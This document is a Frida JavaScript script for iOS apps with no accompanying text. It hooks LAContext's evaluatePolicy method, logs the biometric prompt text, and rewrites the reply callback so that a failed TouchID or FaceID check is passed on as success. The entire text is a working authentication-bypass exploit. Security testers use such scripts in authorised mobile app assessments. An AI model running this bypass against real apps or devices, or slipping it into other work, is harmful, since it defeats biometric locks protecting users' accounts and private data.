var objc = new ApiResolver('objc');
var reply = {};
 
objc.enumerateMatches('-[LAContext evaluatePolicy:localizedReason:reply:]', {
    onMatch: function (match) {
        reply.name = match.name;
        console.log("[*] reply.name : " + match.name);
        reply.address = match.address;
        console.log("[*] reply.address : " + match.address);
    },
    onComplete: function () { }
});
 
if (reply.address) {
    console.log("[+] TouchID Hooked Success!");
    
    Interceptor.attach(reply.address, {
        onEnter: function (args) {
            console.log("\n");
            var reason = new ObjC.Object(args[3]);
            console.log("\t[*] TouchID Popup Message: " + reason.toString());
 
            var originBlock = new ObjC.Block(args[4]);
            var callbackBlock = originBlock.implementation;
            
            originBlock.implementation = function (success, error) {
                if (!success) {
                    success = true;
                }
                console.error("[*] TouchID/FaceID Bypass Success!");
                callbackBlock(success, error);
            };
        }
    });
}